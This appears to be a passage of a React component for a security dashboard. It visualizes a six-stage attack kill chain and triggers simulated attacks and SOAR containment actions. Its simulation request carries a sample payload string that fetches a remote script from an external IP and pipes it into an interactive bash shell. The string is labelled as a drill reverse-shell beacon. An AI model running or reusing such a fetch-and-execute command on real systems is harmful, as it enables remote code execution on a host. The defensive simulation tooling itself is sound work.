/**
 * AttackChainGraph.jsx — Interactive Cyber Kill-Chain Visualizer & Active SOAR Command Grid
 *
 * Enterprise-grade 6-stage Kill-Chain visualizer aligning with Lockheed Martin & MITRE ATT&CK:
 *  1. Recon & Ingress Origin (Attacker IP, Geo, ISP)
 *  2. Delivery & Weaponization (Exploit Payload, Protocol)
 *  3. Initial Foothold & Process Execution (Compromised PID, Shell Command)
 *  4. Privilege Escalation & Persistence (Sudo / Admin Elevation)
 *  5. Defense Evasion & Lateral Movement (Honeytoken & Decoy Canaries)
 *  6. C2 & Exfiltration Target (C2 Beaconing, Targeted Asset)
 *
 * Dynamic State Machine:
 *  - When an attack is happening (simulation started or live breach):
 *      Buttons & indicators turn glowing RED (active attack / threat spreading).
 *  - When SOAR Automation intercepts & kills the attack:
 *      Buttons & indicators turn vibrant GREEN (safe state / threat neutralized).
 */
import { useState, useEffect, useMemo, useRef } from 'react';
import {
  GitBranch,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Lock,
  Skull,
  Server,
  Terminal,
  Database,
  ArrowRight,
  AlertTriangle,
  Flame,
  Radio,
  ExternalLink,
  ChevronRight,
  RotateCcw,
  Sparkles,
  Info,
  CheckCircle2,
  XCircle,
  Play,
} from 'lucide-react';
import toast from 'react-hot-toast';
import { defenseApi, incidentApi, threatApi } from '@/services/api';
import { useSocket } from '@/context/SocketContext';
import { tacticalAudio } from '@/utils/tacticalAudio';

export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange, resetSignal }) {
  const { lastFinding, subscribe } = useSocket();
  const [incidents, setIncidents] = useState([]);
  const [selectedIncidentId, setSelectedIncidentId] = useState('live_feed');
  const [recentThreats, setRecentThreats] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedNodeIndex, setSelectedNodeIndex] = useState(2); // Default to Process stage

  // Containment states: campaignId -> { blocked: bool, killed: bool, isolated: bool, rearmed: bool }
  const [containmentStates, setContainmentStates] = useState({});
  const [executingAction, setExecutingAction] = useState(null);
  const [simulating, setSimulating] = useState(false);

  // Attack cycle state:
  // 1. 'idle'       -> CYAN  (Safe / No attack is there)
  // 2. 'attack'     -> RED   (Attack started / in progress)
  // 3. 'safe'       -> GREEN (Attack taken down / mitigated; auto-reverts to CYAN after 30s)
  const [attackState, setAttackState] = useState('idle');
  const [safeTimerCountdown, setSafeTimerCountdown] = useState(0);
  const timersRef = useRef([]);
  const autoToCyanTimerRef = useRef(null);
  const countdownIntervalRef = useRef(null);

  // 30-second timer: Green (attack taken down) automatically turns into Cyan (safe, no attack)
  useEffect(() => {
    if (attackState === 'safe') {
      setSafeTimerCountdown(30);

      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);

      countdownIntervalRef.current = setInterval(() => {
        setSafeTimerCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(countdownIntervalRef.current);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      autoToCyanTimerRef.current = setTimeout(() => {
        setAttackState('idle');
        setContainmentStates({});
        setSafeTimerCountdown(0);
        toast('💎 30s Safe Window Elapsed: System returned to CYAN monitoring state.', {
          duration: 3500,
        });
      }, 30000);
    } else {
      setSafeTimerCountdown(0);
      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    }

    return () => {
      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, [attackState]);

  // Ref to always hold the current activeKey — fixes stale closure in socket handlers
  const activeKeyRef = useRef('live_feed');

  // When parent resets to idle (e.g. header Safe—Reset button), clear all containment flags
  useEffect(() => {
    if (!resetSignal) return; // 0 = initial mount, skip
    handleResetToIdle();
  }, [resetSignal]);

  // Notify parent (DashboardPage header) whenever attackState changes
  useEffect(() => {
    if (typeof onAttackStateChange === 'function') {
      onAttackStateChange(attackState);
    }
  }, [attackState, onAttackStateChange]);

  // Clear timers on unmount
  useEffect(() => {
    return () => {
      timersRef.current.forEach(clearTimeout);
      if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, []);

  // Fetch initial incidents and recent threats
  const fetchData = async () => {
    try {
      setLoading(true);
      const [incRes, threatRes] = await Promise.all([
        incidentApi.list({ limit: 8 }).catch(() => ({ data: {} })),
        threatApi.list({ limit: 10 }).catch(() => ({ data: {} })),
      ]);

      const incs = incRes.data?.data?.incidents || [];
      const thrs = threatRes.data?.data?.threats || [];

      setIncidents(incs);
      setRecentThreats(thrs);
    } catch {
      // Handled gracefully
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  // Listen for live socket threats
  useEffect(() => {
    if (!lastFinding) return;
    setRecentThreats((prev) => [lastFinding, ...prev.filter((t) => t._id !== lastFinding._id).slice(0, 9)]);

    const isSimulated = lastFinding.rawData?.drill || lastFinding.type?.includes('simulat');
    if (isSimulated) {
      tacticalAudio.playAlarm();
      setAttackState('attack');
      setContainmentStates((prev) => ({
        ...prev,
        [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
        live_feed: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));
      toast('🚨 SIMULATION ATTACK DETECTED: Kill-Chain actively streaming vector progression!', {
        icon: '⚡',
        duration: 4500,
      });
      return;
    }

    tacticalAudio.playRadarPing();

    // New critical/high threat → if not already in safe state, go to 'attack'
    // If currently idle (no prior simulation), go to 'unsafe' instead
    // to distinguish live threat vs simulated one
    if (lastFinding.severity === 'critical' || lastFinding.severity === 'high') {
      setAttackState((prev) => {
        // If we're already in a simulation cycle, keep 'attack'
        if (prev === 'attack' || prev === 'mitigating') return prev;
        // If safe or idle, flag as 'unsafe' (live threat, not simulated)
        return prev === 'idle' ? 'unsafe' : 'attack';
      });
      setContainmentStates((prev) => ({
        ...prev,
        [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));
    }
  }, [lastFinding]);

  // Listen for real-time simulation, incident, and defense events over Socket.IO
  useEffect(() => {
    if (!subscribe) return;

    // Real-time drill simulation start broadcast from backend
    const unsubSim = subscribe('simulation:started', (simData) => {
      if (!simData) return;
      tacticalAudio.playAlarm();
      setAttackState('attack');

      const threat = simData.threat;
      const incident = simData.incident;

      if (threat) {
        setRecentThreats((prev) => [threat, ...prev.filter((t) => t._id !== threat._id).slice(0, 9)]);
      }
      if (incident) {
        setIncidents((prev) => [incident, ...prev.filter((i) => i._id !== incident._id)]);
        setSelectedIncidentId(incident._id);
        activeKeyRef.current = incident._id;
      }
      const targetKey = incident?._id || 'live_feed';
      setContainmentStates((prev) => ({
        ...prev,
        [targetKey]: { blocked: false, killed: false, isolated: false, rearmed: false },
        live_feed: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));

      toast('🚨 SIMULATION ATTACK ACTIVE: Cyber Kill-Chain initiated!', {
        icon: '⚡',
        duration: 4500,
      });
    });

    // New incident created in real time (e.g. correlated simulation)
    const unsubIncNew = subscribe('incident:new', (newInc) => {
      if (!newInc) return;
      setIncidents((prev) => [newInc, ...prev.filter((i) => i._id !== newInc._id)]);
      if (
        newInc.title?.toLowerCase().includes('simulation') ||
        newInc.title?.toLowerCase().includes('drill') ||
        newInc.severity === 'critical'
      ) {
        setSelectedIncidentId(newInc._id);
        activeKeyRef.current = newInc._id;
      }
    });

    // Incident status or notes updated in real time
    const unsubIncUpdated = subscribe('incident:updated', (updatedInc) => {
      if (!updatedInc) return;
      setIncidents((prev) => prev.map((i) => (i._id === updatedInc._id ? { ...i, ...updatedInc } : i)));
      if (updatedInc.status === 'resolved') {
        setAttackState('safe');
        setContainmentStates((prev) => ({
          ...prev,
          [updatedInc._id]: { blocked: true, killed: true, isolated: true, rearmed: true },
          [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
          live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
        }));
      }
    });

    // Attack taken down & incident resolved event
    const unsubIncResolved = subscribe('incident:resolved', (resData) => {
      if (!resData?.incidentId) return;
      setIncidents((prev) =>
        prev.map((i) =>
          i._id === resData.incidentId
            ? { ...i, status: 'resolved', notes: resData.incident?.notes || i.notes, summary: resData.incident?.summary || i.summary }
            : i
        )
      );
      setAttackState('safe');
      setContainmentStates((prev) => ({
        ...prev,
        [resData.incidentId]: { blocked: true, killed: true, isolated: true, rearmed: true },
        [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
        live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
      }));
      tacticalAudio.playNeutralized();
      toast.success(
        `🛡️ Attack Taken Down: Incident #${resData.incidentId.slice(-6)} resolved via ${resData.actionType?.toUpperCase() || 'SOAR'}!`,
        { duration: 5500 }
      );
    });

    const unsubExecuted = subscribe('defense:action:executed', (action) => {
      if (!action) return;
      const key = activeKeyRef.current;
      tacticalAudio.playNeutralized();
      setContainmentStates((prev) => ({
        ...prev,
        [key]: {
          ...prev[key],
          [action.actionType]: true,
          killed: action.actionType === 'kill_process' ? true : prev[key]?.killed,
          isolated: action.actionType === 'isolate_host' ? true : prev[key]?.isolated,
          rearmed: action.actionType === 'quarantine_file' ? true : prev[key]?.rearmed,
        },
        live_feed: {
          ...prev.live_feed,
          [action.actionType]: true,
          killed: action.actionType === 'kill_process' ? true : prev.live_feed?.killed,
          isolated: action.actionType === 'isolate_host' ? true : prev.live_feed?.isolated,
        },
      }));
      setAttackState('safe');
      toast.success(`🛡️ SOAR Automation Enforced: ${action.actionType?.replace(/_/g, ' ').toUpperCase()} · Attack Taken Down`);
    });

    const unsubConfirmed = subscribe('defense:action:confirmed', (receipt) => {
      if (!receipt?.actionType) return;
      const key = activeKeyRef.current;
      // Map actionType to the relevant containment flag
      const actionFlagMap = {
        kill_process: 'killed',
        isolate_host: 'isolated',
        quarantine_file: 'rearmed',
        rearm_honeytoken: 'rearmed',
      };
      const flagKey = actionFlagMap[receipt.actionType] || receipt.actionType;
      setContainmentStates((prev) => ({
        ...prev,
        [key]: {
          ...prev[key],
          [receipt.actionType]: true,
          [flagKey]: true,
        },
        live_feed: {
          ...prev.live_feed,
          [receipt.actionType]: true,
          [flagKey]: true,
        },
      }));
      setAttackState('safe');
      toast.success(`🤖 Autopilot Confirmed: ${receipt.actionType?.replace(/_/g, ' ').toUpperCase()} · Host Secured`);
    });

    return () => {
      unsubSim();
      unsubIncNew();
      unsubIncUpdated();
      unsubIncResolved();
      unsubExecuted();
      unsubConfirmed();
    };
  }, [subscribe]);

  // Derive dynamic kill-chain model based on the selected incident or live threat
  const activeChain = useMemo(() => {
    let sourceThreat = recentThreats[0] || {};
    let title = 'Live Endpoint Ingress Sequence';
    let severity = 'critical';

    if (selectedIncidentId !== 'live_feed') {
      const foundInc = incidents.find((i) => i._id === selectedIncidentId);
      if (foundInc) {
        title = foundInc.title || 'Correlated Incident Campaign';
        severity = foundInc.severity || 'high';
        sourceThreat = foundInc.threatIds?.[0] || sourceThreat;
      }
    } else if (recentThreats.length > 0) {
      sourceThreat = recentThreats[0];
      title = `Real-time Telemetry: ${sourceThreat.type || 'Host Alert'}`;
      severity = sourceThreat.severity || 'critical';
    }

    const attackerIp = sourceThreat.source?.ip || sourceThreat.geo?.ip || '185.193.65.19';
    const loc = sourceThreat.geo?.country
      ? `${sourceThreat.geo?.city ? sourceThreat.geo.city + ', ' : ''}${sourceThreat.geo.country}`
      : 'Moscow, Russia (Bulletproof Gateway)';
    const isp = sourceThreat.geo?.isp || 'Cloud Hosting AS16276';
    const pid = sourceThreat.source?.pid || 8821;
    const processName = sourceThreat.source?.processName || (sourceThreat.type === 'honeytoken_breached' ? 'python3 -c import os' : 'drill_payload.exe');
    const technique = sourceThreat.mitreTechnique || 'T1059.004';
    const rawEvidence = Array.isArray(sourceThreat.evidence) && sourceThreat.evidence[0]
      ? sourceThreat.evidence[0]
      : sourceThreat.description || 'Remote reverse shell connection established via unauthorized socket';

    return {
      id: selectedIncidentId,
      title,
      severity,
      attackerIp,
      attackerLocation: loc,
      attackerIsp: isp,
      protocol: 'TCP / 443 ➔ 5050 (Reverse Payload)',
      pid,
      processName,
      technique,
      rawEvidence,
      targetAsset: 'Primary Sensor: soc-collector-01',
    };
  }, [selectedIncidentId, incidents, recentThreats]);

  const activeKey = activeChain.id;
  // Keep ref in sync with state so socket closures always read the current key
  activeKeyRef.current = activeKey;
  const state = containmentStates[activeKey] || {};

  // Attack cycle states:
  // 1. Safe / No attack: attackState === 'idle' -> CYAN
  // 2. Attack in progress: attackState === 'attack' || attackState === 'unsafe' || attackState === 'mitigating' -> RED
  // 3. Attack taken down: attackState === 'safe' -> GREEN (30-second cooldown, then returns to 'idle' CYAN)
  const isUnderAttack = attackState === 'attack' || attackState === 'unsafe' || attackState === 'mitigating';
  const isSafe = attackState === 'safe';
  const isAttackHappening = isUnderAttack;

  // Build the 6 sequential stages of the attack kill-chain
  const stages = useMemo(() => [
    {
      index: 0,
      stageNumber: '01',
      name: 'Recon & Ingress',
      tactic: 'Reconnaissance / Initial Access',
      mitre: 'T1595 / T1190',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'INSPECTED' : isUnderAttack ? 'MALICIOUS' : 'SECURE',
      title: activeChain.attackerIp,
      subtitle: activeChain.attackerLocation,
      detail: `Originator IP: ${activeChain.attackerIp} (${activeChain.attackerIsp}). External automated probe searching for vulnerable exposed services.`,
      actionLabel: null,
      actionType: null,
      target: activeChain.attackerIp,
      icon: Skull,
      color: 'red',
    },
    {
      index: 1,
      stageNumber: '02',
      name: 'Weaponization',
      tactic: 'Execution / Ingress Payload',
      mitre: 'T1203 / T1059',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'INTERCEPTED' : isUnderAttack ? 'EXPLOITED' : 'INSPECTED',
      title: 'Malicious Web Vector',
      subtitle: activeChain.protocol,
      detail: `Injected command sequence encapsulated in HTTP POST. Technique: ${activeChain.technique}. WAF filter anomaly detected.`,
      actionLabel: null,
      icon: Server,
      color: 'amber',
    },
    {
      index: 2,
      stageNumber: '03',
      name: 'Host Execution',
      tactic: 'Execution',
      mitre: 'T1059.004',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'TERMINATED' : isUnderAttack ? 'EXECUTING' : 'MONITORED',
      title: `PID: ${activeChain.pid}`,
      subtitle: activeChain.processName,
      detail: `Local interpreter spawned child process: "${activeChain.processName}" (PID ${activeChain.pid}). High entropy execution string observed.`,
      actionLabel: isSafe ? 'Process Killed ✓' : isUnderAttack ? 'SIGKILL Process Tree' : 'Audit Process PID',
      actionType: 'kill_process',
      target: `PID: ${activeChain.pid}`,
      icon: Terminal,
      color: 'orange',
    },
    {
      index: 3,
      stageNumber: '04',
      name: 'Privilege Escalation',
      tactic: 'Privilege Escalation',
      mitre: 'T1548.003 (Sudo Rights)',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'BLOCKED' : isUnderAttack ? 'ATTEMPTED' : 'LOCKED',
      title: 'Elevated Tokens',
      subtitle: 'uid=0(root) gid=0(wheel)',
      detail: 'Adversary attempted sudo credential verification and PAM authentication bypass to attain administrator root privileges.',
      actionLabel: null,
      icon: ShieldAlert,
      color: 'purple',
    },
    {
      index: 4,
      stageNumber: '05',
      name: 'Defense Evasion',
      tactic: 'Credential Access',
      mitre: 'T1552.001 (Honeytoken Breach)',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'DECOY RESET' : isUnderAttack ? 'CANARY BREACHED' : 'ARMED',
      title: '~/.eye/canary.env',
      subtitle: 'AWS Decoy Honeytoken Accessed',
      detail: 'Unsolicited access to decoy AWS credentials detected. Honeytoken canary tripwire tripped! Legitimate software never touches this decoy file.',
      actionLabel: isSafe ? 'Canary Armed ✓' : isUnderAttack ? 'Reset Decoy Honeytoken' : 'Verify Canary Decoy',
      actionType: 'rearm_honeytoken',
      target: '~/.eye/canary.env',
      icon: Zap,
      color: 'yellow',
    },
    {
      index: 5,
      stageNumber: '06',
      name: 'C2 & Exfiltration',
      tactic: 'Command & Control',
      mitre: 'T1071.001 (C2 Beacon)',
      status: isSafe ? 'neutralized' : isUnderAttack ? 'active' : 'idle',
      statusLabel: isSafe ? 'ISOLATED' : isUnderAttack ? 'ACTIVE BEACON' : 'STANDBY',
      title: activeChain.targetAsset,
      subtitle: 'Port 4444 C2 Beaconing',
      detail: `Outbound socket connection to external Command & Control beacon. Targeted asset: ${activeChain.targetAsset}.`,
      actionLabel: isSafe ? 'Host Isolated ✓' : isUnderAttack ? 'Isolate Host Network' : 'Network Baseline OK',
      actionType: 'isolate_host',
      target: activeChain.targetAsset,
      icon: Database,
      color: 'cyan',
    },
  ], [activeChain, state, isSafe, isUnderAttack]);

  // Execute active countermeasure (manual click)
  const handleContainment = async (actionType, target, label) => {
    try {
      setExecutingAction(actionType);
      const res = await defenseApi.contain({
        actionType: actionType === 'rearm_honeytoken' ? 'quarantine_file' : actionType,
        target,
        reason: `SOAR Kill-Chain Countermeasure: ${actionType} triggered from Dashboard`,
        incidentId: selectedIncidentId !== 'live_feed' ? selectedIncidentId : null,
        executedBy: 'analyst',
      });

      if (res.data?.status === 'success') {
        tacticalAudio.playNeutralized();
        toast.success(`🛡️ Countermeasure Enforced: ${label}`);
        setContainmentStates((prev) => ({
          ...prev,
          [activeKey]: {
            ...prev[activeKey],
            [actionType]: true,
          },
        }));

        // If countermeasure taken, set safe state (turning buttons green)
        if (actionType === 'kill_process' || actionType === 'isolate_host' || actionType === 'quarantine_file') {
          setAttackState('safe');
        }
      }
    } catch (err) {
      toast.error(`Countermeasure failed: ${err.response?.data?.message || err.message}`);
    } finally {
      setExecutingAction(null);
    }
  };

  // Reset back to idle (Cyan safe mode)
  const handleResetToIdle = () => {
    timersRef.current.forEach(clearTimeout);
    timersRef.current = [];
    if (autoToCyanTimerRef.current) clearTimeout(autoToCyanTimerRef.current);
    if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    setSafeTimerCountdown(0);
    setAttackState('idle');
    setContainmentStates({});
    toast('💎 System returned to CYAN safe monitoring mode.', { duration: 2500 });
  };

  // Full Attack Simulation & Automation Kill-Chain Cycle
  const handleQuickSimulate = async () => {
    // If currently in safe state, first click resets to idle so user sees clean slate
    if (isSafe) {
      handleResetToIdle();
      return;
    }
    try {
      timersRef.current.forEach(clearTimeout);
      timersRef.current = [];

      setSimulating(true);
      // 1. Attack Starts -> Turn everything RED!
      setAttackState('attack');
      setContainmentStates((prev) => ({
        ...prev,
        [activeKey]: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));

      tacticalAudio.playAlarm();
      toast('🚨 ATTACK DETECTED: Synthetic multi-stage exploit detonated on host!', {
        icon: '⚡',
        duration: 4000,
      });

      const simIp = '185.193.65.' + Math.floor(Math.random() * 200 + 10);
      const simPid = Math.floor(Math.random() * 8000 + 1000);

      const simRes = await threatApi.simulate({
        type: 'command_injection',
        severity: 'critical',
        sourceIp: simIp,
        sourcePid: simPid,
        ip: simIp,
        pid: simPid,
        process: 'curl -s http://185.193.65.19/drill.sh | bash -i',
        description: `Simulated APT29 command injection & reverse shell beacon (PID ${simPid})`,
        payload: 'curl -s http://185.193.65.19/drill.sh | bash -i',
      });

      const simIncident = simRes.data?.data?.incident;
      const simThreat = simRes.data?.data?.threat;
      if (simIncident?._id) {
        setSelectedIncidentId(simIncident._id);
        activeKeyRef.current = simIncident._id;
        setIncidents((prev) => [simIncident, ...prev.filter((i) => i._id !== simIncident._id)]);
      }

      await fetchData();

      // 2. Automation Engages after progression window
      const t1 = setTimeout(() => {
        setAttackState('mitigating');
        toast('⚡ SOAR Automation Triggered: Intercepting process tree & enforcing blocklist...', {
          icon: '🛡️',
          duration: 2500,
        });
      }, 1600);
      timersRef.current.push(t1);

      // 3. Automation KILLS the attack -> State becomes SAFE, ALL BUTTONS TURN GREEN!
      const t2 = setTimeout(async () => {
        try {
          const currentIncId = simIncident?._id || (selectedIncidentId !== 'live_feed' ? selectedIncidentId : null);
          const currentThrId = simThreat?._id || null;

          await Promise.allSettled([
            defenseApi.contain({
              actionType: 'kill_process',
              target: String(simPid),
              incidentId: currentIncId,
              threatId: currentThrId,
              reason: 'SOAR Autonomous Process Termination (Kill-Chain Mitigated)',
              executedBy: 'automation',
            }),
            defenseApi.contain({
              actionType: 'isolate_host',
              target: 'soc-collector-01',
              incidentId: currentIncId,
              threatId: currentThrId,
              reason: 'SOAR Autonomous Host Isolation (Egress Restricted)',
              executedBy: 'automation',
            }),
          ]);

          const key = activeKeyRef.current;
          setContainmentStates((prev) => ({
            ...prev,
            [key]: { blocked: true, killed: true, isolated: true, rearmed: true },
            live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
          }));

          setAttackState('safe');
          tacticalAudio.playNeutralized();
          toast.success('🛡️ ATTACK TAKEN DOWN: Threat neutralized. Correlated incident marked RESOLVED!', {
            duration: 6000,
          });
        } catch {
          // Fallback safe state
          setContainmentStates((prev) => ({
            ...prev,
            [activeKeyRef.current]: { blocked: true, killed: true, isolated: true, rearmed: true },
            live_feed: { blocked: true, killed: true, isolated: true, rearmed: true },
          }));
          setAttackState('safe');
        } finally {
          setSimulating(false);
        }
      }, 3200);
      timersRef.current.push(t2);

    } catch (err) {
      toast.error('Simulation failed: ' + err.message);
      setSimulating(false);
      setAttackState('idle');
    }
  };

  // Status badge style helper:
  // - GREEN when attack taken down (safe state)
  // - RED when attack is active
  // - CYAN when idle / normal monitoring
  const getStatusBadge = () => {
    if (isSafe) {
      return 'bg-emerald-950/90 border-emerald-500/70 text-emerald-300';
    }
    if (isUnderAttack) {
      return 'bg-red-950/90 border-red-700/80 text-red-300 animate-pulse';
    }
    return 'bg-cyan-950/80 border-cyan-500/60 text-cyan-300';
  };

  const activeNode = stages[selectedNodeIndex] || stages[0];

  return (
    <div className="glass-card glow-border p-4 relative overflow-hidden">
      {/* ── Top Header & Threat Level ─────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
        <div className="flex items-center gap-2.5">
          <div
            className={`p-2 rounded-lg border shadow-sm transition-colors ${
              isUnderAttack
                ? 'bg-red-950/70 border-red-700/60 text-red-400'
                : isSafe
                ? 'bg-emerald-950/70 border-emerald-700/60 text-emerald-400'
                : 'bg-cyan-950/70 border-cyan-700/60 text-cyan-400'
            }`}
          >
            <GitBranch className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <h3 className="text-sm font-semibold text-slate-100 tracking-wide font-mono">
                LIVE KILL-CHAIN ATTACK GRAPH
              </h3>

              {/* Dynamic Status Pill:
                  - CYAN when safe / no attack
                  - RED when attack started
                  - GREEN when attack is taken down (30s cooldown before auto-turning cyan)
              */}
              {isSafe ? (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-emerald-300 bg-emerald-950/90 px-2.5 py-0.5 rounded-full border border-emerald-500/70 shadow-sm shadow-emerald-950/60 animate-fade-in">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                  ATTACK TAKEN DOWN · SAFE ({safeTimerCountdown}s ➔ CYAN)
                </span>
              ) : isUnderAttack ? (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-red-300 bg-red-950/90 px-2.5 py-0.5 rounded-full border border-red-600/90 shadow-sm shadow-red-950/60 animate-pulse">
                  <Flame className="w-3.5 h-3.5 text-red-400 animate-pulse" />
                  {attackState === 'mitigating' ? 'SOAR MITIGATING ATTACK...' : 'ATTACK ACTIVE · RED ALERT'}
                </span>
              ) : (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-cyan-300 bg-cyan-950/80 px-2.5 py-0.5 rounded-full border border-cyan-500/60 shadow-sm shadow-cyan-950/50">
                  <Shield className="w-3.5 h-3.5 text-cyan-400" />
                  SAFE · NO ATTACK DETECTED · CYAN MONITORING
                </span>
              )}
            </div>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Lockheed Martin 6-stage MITRE ATT&CK progression with real-time SOAR countermeasures
            </p>
          </div>
        </div>

        {/* Action Controls & Feed Selector */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Campaign Selector */}
          <div className="flex items-center gap-1.5 bg-surface-800/90 px-2.5 py-1 rounded-lg border border-surface-700/70 text-xs">
            <span className="text-slate-500 font-mono text-[11px]">View:</span>
            <select
              value={selectedIncidentId}
              onChange={(e) => setSelectedIncidentId(e.target.value)}
              className="bg-transparent text-slate-200 text-xs font-mono focus:outline-none cursor-pointer"
            >
              <option value="live_feed" className="bg-surface-900 text-cyan-300">
                ⚡ Real-time Telemetry Stream
              </option>
              {incidents.map((inc) => (
                <option key={inc._id} value={inc._id} className="bg-surface-900 text-slate-200">
                  {inc.status === 'resolved' ? '✓ [TAKEN DOWN] ' : '🚨 [ACTIVE] '}
                  {inc.title?.slice(0, 26)} ({inc.severity})
                </option>
              ))}
            </select>
          </div>

          {/* 
            Simulate Attack Button:
            - CYAN when safe / no attack
            - RED when attack is happening / simulation started
            - GREEN when safe state after automation killed it (lasts 30s)
          */}
          <button
            onClick={handleQuickSimulate}
            disabled={simulating}
            className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 shadow-md ${
              isUnderAttack
                ? 'bg-red-600 hover:bg-red-500 text-white border border-red-500 shadow-lg shadow-red-950/80 animate-pulse'
                : isSafe
                ? 'bg-emerald-950/90 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/70 shadow-md shadow-emerald-950/60'
                : 'bg-cyan-950/80 hover:bg-cyan-900/90 text-cyan-300 border border-cyan-500/60 shadow-md shadow-cyan-950/50'
            }`}
            title={
              isSafe
                ? `System safe for ${safeTimerCountdown}s. Click to simulate new attack.`
                : isUnderAttack
                ? 'Attack currently underway'
                : 'Detonate simulated attack vector'
            }
          >
            {isUnderAttack ? (
              <>
                <Flame className="w-3.5 h-3.5 text-white animate-bounce" />
                <span>{attackState === 'mitigating' ? 'Mitigating...' : 'Attack in Progress...'}</span>
              </>
            ) : isSafe ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                <span>Attack Taken Down ({safeTimerCountdown}s)</span>
              </>
            ) : (
              <>
                <Zap className="w-3.5 h-3.5 text-cyan-400" />
                <span>Simulate Attack</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* ── Real-Time Status Notification Banners ──────────────────── */}
      {isUnderAttack && (
        <div className="mb-4 p-3 rounded-xl bg-red-950/60 border border-red-600/70 flex items-center justify-between gap-3 text-red-300 shadow-md shadow-red-950/50 animate-pulse">
          <div className="flex items-center gap-2.5 text-xs font-mono">
            <Skull className="w-4 h-4 text-red-400 shrink-0 animate-bounce" />
            <span>
              <strong className="text-red-200">ATTACK STARTED (RED ALERT):</strong> Live exploit vector active across Kill-Chain. Attacker IP:{' '}
              <span className="text-red-100 font-bold font-mono">{activeChain.attackerIp}</span> · Target PID:{' '}
              <span className="text-red-100 font-bold font-mono">{activeChain.pid}</span>.
            </span>
          </div>
          <span className="text-[10px] font-mono uppercase tracking-wider px-2 py-0.5 rounded bg-red-900/80 text-red-200 border border-red-500/50 shrink-0 font-bold">
            STAGE 01 ➔ 06 ACTIVE
          </span>
        </div>
      )}

      {isSafe && (
        <div className="mb-4 p-3 rounded-xl bg-emerald-950/60 border border-emerald-500/60 flex items-center justify-between gap-3 text-emerald-300 shadow-md shadow-emerald-950/40 animate-fade-in">
          <div className="flex items-center gap-2.5 text-xs font-mono">
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>
              <strong className="text-emerald-200">ATTACK TAKEN DOWN (GREEN STATE):</strong> SOAR Autonomous Countermeasure successfully executed! Incident is marked <strong className="underline text-emerald-100">RESOLVED</strong>. System will automatically transition to calm <strong className="text-cyan-300">CYAN</strong> state in <strong className="text-emerald-100 font-bold">{safeTimerCountdown}s</strong>.
            </span>
          </div>
          <button
            onClick={handleResetToIdle}
            className="text-[11px] font-mono px-2.5 py-1 rounded bg-emerald-900/80 hover:bg-emerald-800 text-emerald-100 border border-emerald-500/60 transition-colors shrink-0 font-semibold"
          >
            Return to Cyan Now
          </button>
        </div>
      )}

      {!isUnderAttack && !isSafe && (
        <div className="mb-4 p-2.5 rounded-xl bg-cyan-950/40 border border-cyan-600/40 flex items-center justify-between gap-3 text-cyan-300 shadow-sm shadow-cyan-950/30">
          <div className="flex items-center gap-2 text-xs font-mono">
            <Shield className="w-4 h-4 text-cyan-400 shrink-0" />
            <span>
              <strong className="text-cyan-200">SYSTEM SECURE (CYAN MODE):</strong> No active intrusions detected. Autonomous sensors listening on endpoint telemetry.
            </span>
          </div>
          <span className="text-[10px] font-mono uppercase tracking-wider px-2 py-0.5 rounded bg-cyan-900/50 text-cyan-300 border border-cyan-600/40 shrink-0 font-semibold">
            All 6 Stages Normal
          </span>
        </div>
      )}

      {/* ── 6-Stage Visual Kill-Chain Track ──────────────────────────── */}
      <div className="bg-[#020617] rounded-xl border border-surface-700/70 p-4 select-none relative overflow-x-auto shadow-inner">
        {/* Radar subtle grid pattern */}
        <div
          className="absolute inset-0 opacity-10 pointer-events-none"
          style={{
            backgroundImage: `radial-gradient(circle at 1px 1px, #38bdf8 1px, transparent 0)`,
            backgroundSize: '20px 20px',
          }}
        />

        <div className="min-w-[980px] flex items-stretch justify-between gap-2 relative z-10 py-1">
          {stages.map((st, i) => {
